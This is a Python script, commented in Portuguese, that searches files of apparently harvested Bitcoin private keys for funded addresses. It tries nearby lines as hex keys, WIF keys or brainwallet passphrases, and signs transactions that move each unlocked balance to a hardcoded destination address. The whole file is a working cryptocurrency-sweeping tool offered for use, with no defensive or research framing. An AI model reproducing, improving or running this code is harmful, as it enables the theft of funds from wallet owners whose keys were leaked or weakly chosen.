import requests
import re
import time
import sys
import hashlib
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

# --- CONFIGURAÇÕES ---
DEST_ADDRESS = 'bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk'
FILES_TO_SCAN = ['privatekeys.txt', 'priv.key.rtf', 'chavprivelet1.txt', 'chaves_extraidas_e_enderecos_1.txt']

def check_balance_api(address):
    """Consulta saldo com fallback"""
    for api_url in [f"https://mempool.space/api/address/{address}", f"https://blockstream.info/api/address/{address}"]:
        try:
            r = requests.get(api_url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                stats = data.get('chain_stats', {})
                return stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
        except: continue
    return 0

def create_hex_transaction(addr, wif, utxos_val):
    """Gera o HEX assinado para o Shell enviar"""
    try:
        r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=15)
        utxos = r.json()
        if not utxos: return
        tx = Transaction(network='bitcoin')
        fee = 35000 
        amount = utxos_val - fee
        if amount > 1000:
            for u in utxos:
                tx.add_input(prev_txid=u['txid'], output_n=u['vout'], value=u['value'], address=addr)
            tx.add_output(value=amount, address=DEST_ADDRESS)
            tx.sign([wif])
            print(f"HEX_GEN:{tx.raw_hex()}")
            sys.stdout.flush()
    except Exception: pass

def attempt_unlock(key_material, target_addr=None):
    """Tenta abrir endereços a partir de um material bruto (HEX, WIF ou Texto)"""
    try:
        # Se for HEX 64 chars
        if len(key_material) == 64 and all(c in '0123456789abcdefABCDEF' for c in key_material):
            priv_bytes = bytes.fromhex(key_material)
        # Se for WIF (5, L, K)
        elif re.match(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', key_material):
            k_obj = Key(key_material, network='bitcoin')
            priv_bytes = k_obj.private_byte
        # Se for texto (Brainwallet)
        else:
            priv_bytes = hashlib.sha256(key_material.encode()).digest()

        for comp in [True, False]:
            k = Key(priv_bytes, network='bitcoin', compressed=comp)
            for addr_type in [None, 'p2sh-p2wpkh', 'p2wpkh']:
                addr_gen = k.address(witness_type=addr_type)
                
                # Se estivermos focados em um alvo ou apenas varrendo
                if target_addr and addr_gen == target_addr:
                    bal = check_balance_api(addr_gen)
                    if bal > 0:
                        print(f"💰 SUCESSO! Chave encontrada para {addr_gen}")
                        create_hex_transaction(addr_gen, k.wif(), bal)
                        return True
                else:
                    # Varredura geral (lenta se houver muitos itens)
                    pass 
    except: pass
    return False

def run_proximity_scan():
    print("☢️ INICIANDO SCANNER DE PROXIMIDADE E SALDO...")
    sys.stdout.flush()
    
    for file_path in FILES_TO_SCAN:
        try:
            with open(file_path, 'r', errors='ignore') as f:
                lines = f.readlines()
                
            for i, line in enumerate(lines):
                # Busca endereços na linha atual
                addresses = re.findall(r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59}', line)
                
                for addr in addresses:
                    balance = check_balance_api(addr)
                    if balance > 0:
                        print(f"🚨 ALVO DETECTADO: {addr} | Saldo: {balance} sats")
                        sys.stdout.flush()
                        
                        # TESTE DE PROXIMIDADE: Pega 5 linhas antes e 5 depois
                        start = max(0, i - 5)
                        end = min(len(lines), i + 6)
                        context = lines[start:end]
                        
                        print(f"   ∟ Testando {len(context)} linhas ao redor do alvo...")
                        for ctx_line in context:
                            clean_val = ctx_line.strip()
                            if len(clean_val) > 8:
                                # Tenta extrair WIF/HEX de dentro da linha de contexto também
                                potential_keys = re.findall(r'[0-9a-fA-F]{64}|[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', clean_val)
                                items_to_test = [clean_val] + potential_keys
                                
                                for item in items_to_test:
                                    if attempt_unlock(item, target_addr=addr):
                                        print(f"✅ CHAVE VÁLIDA ENCONTRADA NA PROXIMIDADE!")
                                        sys.stdout.flush()
        except Exception as e:
            print(f"Erro no arquivo {file_path}: {e}")

if __name__ == "__main__":
    run_proximity_scan()
